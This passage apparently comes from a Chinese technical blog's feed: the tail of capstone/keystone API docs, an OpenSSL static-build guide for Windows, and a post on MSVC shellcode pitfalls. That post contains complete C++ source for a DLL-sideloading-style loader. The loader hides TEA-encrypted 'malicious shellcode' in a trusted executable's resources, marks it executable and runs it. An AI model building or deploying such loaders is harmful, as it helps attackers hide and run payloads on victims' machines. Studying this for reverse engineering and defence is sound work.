Exceptions）标志，控制浮点运算是否抛出异常</td></tr><tr><td>bytes</td><td>bytearray</td><td>指令的原始二进制数据</td></tr><tr><td>disp</td><td>int</td><td>SIB位移（displacement）</td></tr><tr><td>disp_offset</td><td>int</td><td>SIB位移在指令中的位置</td></tr><tr><td>disp_size</td><td>int</td><td>SIB位移大小</td></tr><tr><td>eflags</td><td>int</td><td>该指令可能会修改的eflags标志，由X86_EFLAGS_*枚举，例如cmp指令该值为<code>0011 1111</code>，代表会修改AF CF SF ZF PF OF标志</td></tr><tr><td>encoding</td><td>CsX86Encoding</td><td>包含<code>disp_offset</code> <code>disp_size</code> <code>imm_offset</code> <code>imm_size</code> <code>modrm_offset</code></td></tr><tr><td>fpu_flags</td><td>int</td><td>该指令可能会修改的浮点单元（Floating Point Unit）标志，由X86_FPU_FLAGS_*枚举</td></tr><tr><td>groups</td><td>List[int]</td><td>指令所属的组，由X86_GRP_*枚举，例如和分支相关的指令为X86_GRP_BRANCH_RELATIVE</td></tr><tr><td>id</td><td>int</td><td>指令的id，由X86_INS_*枚举，例如460是X86_INS_MOV</td></tr><tr><td>imm_offset</td><td>int</td><td>立即数在指令中的位置</td></tr><tr><td>imm_size</td><td>int</td><td>立即数的字节大小</td></tr><tr><td>menmonic</td><td>str</td><td>指令字符串，例如”mov”</td></tr><tr><td>modrm</td><td>int</td><td>ModR&#x2F;M字节</td></tr><tr><td>modrm_offset</td><td>int</td><td>ModR&#x2F;M字节在指令中的位置</td></tr><tr><td>op_str</td><td>str</td><td>操作数字符串，例如”rax, qword ptr [rip + 0x13b8]“</td></tr><tr><td>opcode</td><td>List[int]</td><td>操作码</td></tr><tr><td>operands</td><td>List[X86Op]</td><td>操作数类</td></tr><tr><td>prefix</td><td>List[int]</td><td>前缀，用于切换操作数大小、指定段寄存器等</td></tr><tr><td>regs_read</td><td>List[int]</td><td>读取的寄存器，由X86_REG_*枚举，例如35是X86_REG_RAX</td></tr><tr><td>regs_write</td><td>List[int]</td><td>写入的寄存器，同上</td></tr><tr><td>rex</td><td>int</td><td>REX字节</td></tr><tr><td>sib</td><td>int</td><td>SIB字节</td></tr><tr><td>sib_base</td><td>int</td><td>SIB基址寄存器（base）</td></tr><tr><td>sib_index</td><td>int</td><td>SIB索引寄存器（index）</td></tr><tr><td>sib_scale</td><td>int</td><td>SIB比例因子（scale）</td></tr><tr><td>size</td><td>int</td><td>指令原始二进制数据的长度</td></tr><tr><td>sse_cc</td><td>int</td><td>SSE指令的条件码</td></tr><tr><td>xop_cc</td><td>int</td><td>XOP指令的条件码</td></tr></tbody></table><h1 id="X86Op类（操作数类）"><a href="#X86Op类（操作数类）" class="headerlink" title="X86Op类（操作数类）"></a>X86Op类（操作数类）</h1><table><thead><tr><th>成员变量</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>access</td><td>int</td><td>指令对内存或寄存器的访问模式，是读取（CS_AC_READ）还是写入（CS_AC_WRITE）</td></tr><tr><td>avx_bcast</td><td>int</td><td>AVX指令广播模式，由CS_AVX_BCAST_*枚举</td></tr><tr><td>avx_zero_opmask</td><td>bool</td><td>AVX指令是否使用零掩码（好像只有AVX-512支持），也就是是否将掩码寄存器中未选中的元素置零</td></tr><tr><td>imm</td><td>int</td><td>如果操作数是立即数，该值就是该立即数</td></tr><tr><td>mem</td><td>X86OpMem</td><td>如果操作数是内存，该类存放的就是SIB寻址内容</td></tr><tr><td>mem.base</td><td>int</td><td>SIB基址寄存器（base）</td></tr><tr><td>mem.disp</td><td>int</td><td>SIB位移（displacement）</td></tr><tr><td>mem.index</td><td>int</td><td>SIB索引寄存器（index）</td></tr><tr><td>mem.scale</td><td>int</td><td>SIB比例因子（scale）</td></tr><tr><td>mem.segment</td><td>int</td><td>SIB段选择子（segment）</td></tr><tr><td>reg</td><td>int</td><td>如果操作数是寄存器，该值就是该寄存器</td></tr><tr><td>size</td><td>int</td><td>操作大小，比如al是1，ax是2，eax是4，rax是8</td></tr><tr><td>type</td><td>int</td><td>操作数类型，是立即数（X86_OP_IMM）还是寄存器（X86_OP_REG）还是内存（X86_OP_MEM）</td></tr><tr><td>value</td><td>X86OpValue</td><td>包含<code>mem</code> <code>imm</code> <code>reg</code></td></tr></tbody></table><h1 id="keystone文档"><a href="#keystone文档" class="headerlink" title="keystone文档"></a>keystone文档</h1><p>都反汇编了，顺带把汇编的文档也写了（笑</p><p>反汇编用<a href="https://www.capstone-engine.org/">capstone</a>，那么汇编就要用到<a href="https://www.keystone-engine.org/">keystone</a></p><p>从pip安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install keystone-engine<br></code></pre></td></tr></table></figure><p>从pip更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install keystone-engine --upgrade<br></code></pre></td></tr></table></figure><p>这玩意用起来非常简单，都不需要文档，贴个代码瞪眼一看就懂了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> keystone <span class="hljs-keyword">import</span> *<br><br>instructions_str=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">push rbp</span><br><span class="hljs-string">mov rax, qword ptr [rip + 0x13b8]</span><br><span class="hljs-string">cmp rbx, rax</span><br><span class="hljs-string">je LABEL_1</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">LABEL_1:</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">try</span>:<br>    encoding, count = Ks(KS_ARCH_X86, KS_MODE_64).asm(instructions_str)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.bin&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(<span class="hljs-built_in">bytes</span>(encoding))<br><span class="hljs-keyword">except</span> KsError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;编译错误：%s&quot;</span> % e)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>文档</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>逆向工程</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在windows上静态编译openssl</title>
    <link href="/articles/openssl/"/>
    <url>/articles/openssl/</url>
    
    <content type="html"><![CDATA[<p>下载openssl源码解压：<a href="https://github.com/openssl/openssl/releases/">https://github.com/openssl/openssl/releases/</a></p><p>下载perl，这里用strawberryperl：<a href="https://strawberryperl.com/">https://strawberryperl.com/</a></p><p>下载nasm：<a href="https://nasm.us/">https://nasm.us/</a></p><p>配置好perl和nasm的环境变量</p><p>打开vs的开发者命令提示符</p><p><img src="/articles/openssl/1.png"></p><p>编译64位就用64位的提示符，32位就用32位的提示符</p><p>cd到openssl的源码目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">配置64位</span><br>perl Configure VC-WIN64A no-shared --prefix=G:/build/64<br><span class="hljs-meta prompt_">#</span><span class="language-bash">配置32位</span><br>perl Configure VC-WIN32 no-shared --prefix=G:/build/32<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">编译</span><br>nmake<br><span class="hljs-meta prompt_">#</span><span class="language-bash">测试</span><br>nmake test<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装，配置时不指定--prefix就默认安装到Program Files文件夹中</span><br>nmake install<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msvc写shellcode的坑</title>
    <link href="/articles/shellcode/"/>
    <url>/articles/shellcode/</url>
    
    <content type="html"><![CDATA[<p>shellcode模板：<a href="https://github.com/Brassinolide/windows-shellcode-template">https://github.com/Brassinolide/windows-shellcode-template</a></p><p>项目设置：</p><blockquote><p>关闭安全检查<br>修改入口点到shellcode<br>关闭增强指令集优化（对于32位）<br>忽略所有默认库<br>移除清单文件<br>移除调试信息（非必须，不移除还能打断点调试调试）</p></blockquote><h1 id="函数排布问题"><a href="#函数排布问题" class="headerlink" title="函数排布问题"></a>函数排布问题</h1><p>对于msvc来说，编译出的汇编代码排布顺序就是源文件中的定义顺序（一般情况下是这样，特殊情况没见过）</p><p><img src="/articles/shellcode/1.png"></p><p>从IDA就能看出来</p><p><img src="/articles/shellcode/2.png"></p><p>exe程序可以设置入口点执行正确的入口函数，但shellcode不能，入口函数必须要放在开头，不然就会先执行其他函数导致程序崩溃</p><p>三种解决办法，一是将入口函数的定义放在源文件最前面（最佳解决方法），二是<code>__forceinline</code>强制内联所有函数（增大体积，不推荐），三是在shellcode开头写个jmp跳转到正确的入口函数</p><h1 id="向量优化问题"><a href="#向量优化问题" class="headerlink" title="向量优化问题"></a>向量优化问题</h1><p>常量数据按以下方式声明才会被硬编码到指令中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-type">const</span> <span class="hljs-type">char</span> str3[] = &#123;<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">0</span>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/articles/shellcode/3.png"></p><p><img src="/articles/shellcode/4.png"></p><p>但是，这种方式还存在一种微妙的向量优化问题</p><p>数据长度超过15字节后，编译器就会自动进行向量优化。问题在于，被向量化的数据会放入data区段</p><p><img src="/articles/shellcode/5.png"></p><p>32位程序可以指定编译选项<code>/arch:IA32</code>禁用向量优化，但64位不行（64位CPU全部支持SSE2指令集，所以微软默认启用了SSE2优化，且无法关闭）</p><p>如果数据长度超过15字节，只能使用<code>volatile</code>修饰来阻止编译器进行向量优化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-type">const</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">char</span> str1[<span class="hljs-number">16</span>] = &#123; <span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">printf</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)str1);<br></code></pre></td></tr></table></figure><p><img src="/articles/shellcode/6.png"></p><p>这样做的副作用也很明显，原先一条指令能复制4字节数据，现在只能复制1字节，增加了shellcode的体积</p><h1 id="白加黑加载器示例"><a href="#白加黑加载器示例" class="headerlink" title="白加黑加载器示例"></a>白加黑加载器示例</h1><p>用上方的shellcode模板写的一个白加黑加载器示例</p><p>编译出的加载器shellcode直接写到白文件中，运行时加载器从白文件的资源中读取恶意shellcode并运行</p><p>没有什么免杀性，仅供示例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* LoadLibraryA_t)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR lpLibFileName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* GetProcAddress_t)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR  lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(WINAPI* MessageBoxA_t)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND   hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">UINT   uType</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* GetModuleHandleA_t)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR lpModuleName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HRSRC</span><span class="hljs-params">(WINAPI* FindResourceA_t)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR  lpName,</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR  lpType</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HGLOBAL</span><span class="hljs-params">(WINAPI* LoadResource_t)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">HRSRC   hResInfo</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">LPVOID</span><span class="hljs-params">(WINAPI* LockResource_t)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HGLOBAL hResData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* VirtualProtect_t)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">SIZE_T dwSize,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD  flNewProtect,</span></span><br><span class="hljs-params"><span class="hljs-function">PDWORD lpflOldProtect</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">mytea</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size, <span class="hljs-type">uint8_t</span> key[<span class="hljs-number">16</span>])</span></span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">payload_header</span><br>&#123;<br><span class="hljs-type">uint8_t</span> key[<span class="hljs-number">16</span>];<br><span class="hljs-type">uint32_t</span> size;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">//大于15字节要用volatile修饰避免被向量化</span><br><span class="hljs-type">const</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">char</span> GetModuleHandleA_s[] = &#123; <span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> FindResourceA_s[] = &#123; <span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> LoadResource_s[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> LockResource_s[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> MyResource_s[] = &#123; <span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> VirtualProtect_s[] = &#123; <span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br><br>GetModuleHandleA_t MyGetModuleHandleA = (GetModuleHandleA_t)<span class="hljs-built_in">GetK32Proc</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)GetModuleHandleA_s);<br>FindResourceA_t MyFindResourceA = (FindResourceA_t)<span class="hljs-built_in">GetK32Proc</span>(FindResourceA_s);<br>LoadResource_t MyLoadResource = (LoadResource_t)<span class="hljs-built_in">GetK32Proc</span>(LoadResource_s);<br>LockResource_t MyLockResource = (LockResource_t)<span class="hljs-built_in">GetK32Proc</span>(LockResource_s);<br>VirtualProtect_t MyVirtualProtect = (VirtualProtect_t)<span class="hljs-built_in">GetK32Proc</span>(VirtualProtect_s);<br><br>HMODULE h = <span class="hljs-built_in">MyGetModuleHandleA</span>(<span class="hljs-number">0</span>);<br>HRSRC r = <span class="hljs-built_in">MyFindResourceA</span>(h, MyResource_s, <span class="hljs-built_in">MAKEINTRESOURCEA</span>(RT_BITMAP));<br><span class="hljs-keyword">if</span> (!r)<span class="hljs-keyword">return</span>;<br>HGLOBAL rc = <span class="hljs-built_in">MyLoadResource</span>(h, r);<br><span class="hljs-keyword">if</span> (!rc)<span class="hljs-keyword">return</span>;<br>BYTE* data = (BYTE*)<span class="hljs-built_in">MyLockResource</span>(rc);<br><span class="hljs-keyword">if</span> (!data)<span class="hljs-keyword">return</span>;<br><br>payload_header* header = (payload_header*)data;<br><br>DWORD old;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">MyVirtualProtect</span>(data, header-&gt;size + <span class="hljs-keyword">sizeof</span> payload_header, PAGE_EXECUTE_READWRITE, &amp;old))<span class="hljs-keyword">return</span>;<br><br><span class="hljs-built_in">mytea</span>(data + <span class="hljs-keyword">sizeof</span> payload_header, header-&gt;size, header-&gt;key);<br><br>((<span class="hljs-built_in">void</span>(*)())(<span class="hljs-type">void</span>*)(data + <span class="hljs-keyword">sizeof</span> payload_header))();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span> <span class="hljs-title">tea_encrypt</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> v, <span class="hljs-type">uint32_t</span>* k)</span> </span>&#123;<br><span class="hljs-type">uint32_t</span> v0 = ((<span class="hljs-type">uint32_t</span>*)&amp;v)[<span class="hljs-number">0</span>], v1 = ((<span class="hljs-type">uint32_t</span>*)&amp;v)[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0</span>;<br><span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br><span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>sum += delta;<br>v0 += ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>v1 += ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> result = <span class="hljs-number">0</span>;<br>((<span class="hljs-type">uint32_t</span>*)&amp;result)[<span class="hljs-number">0</span>] = v0;<br>((<span class="hljs-type">uint32_t</span>*)&amp;result)[<span class="hljs-number">1</span>] = v1;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">//CTR操作模式，无需填充，加密和解密一样</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">mytea</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size, <span class="hljs-type">uint8_t</span> key[<span class="hljs-number">16</span>])</span> </span>&#123;<br><span class="hljs-type">uint64_t</span> counter = *(<span class="hljs-type">uint64_t</span>*)key;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> offset = <span class="hljs-number">0</span>; offset &lt; size; offset += <span class="hljs-number">8</span>, ++counter) &#123;<br><span class="hljs-type">size_t</span> remaining = size - offset;<br><br><span class="hljs-keyword">if</span> (remaining &gt;= <span class="hljs-number">8</span>) &#123;<br>(*(<span class="hljs-type">uint64_t</span>*)(data + offset)) ^= <span class="hljs-built_in">tea_encrypt</span>(counter, (<span class="hljs-type">uint32_t</span>*)key);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">uint8_t</span> temp[<span class="hljs-number">8</span>]&#123;&#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; remaining; ++i)temp[i] = (data + offset)[i];<br>(*(<span class="hljs-type">uint64_t</span>*)temp) ^= <span class="hljs-built_in">tea_encrypt</span>(counter, (<span class="hljs-type">uint32_t</span>*)key);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; remaining; ++i)(data + offset)[i] = temp[i];<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【考研408】CRC算法详解，并用SIMD SSE4.2实现CRC32</title>
    <link href="/articles/simdcrc/"/>
    <url>/articles/simdcrc/</url>
    
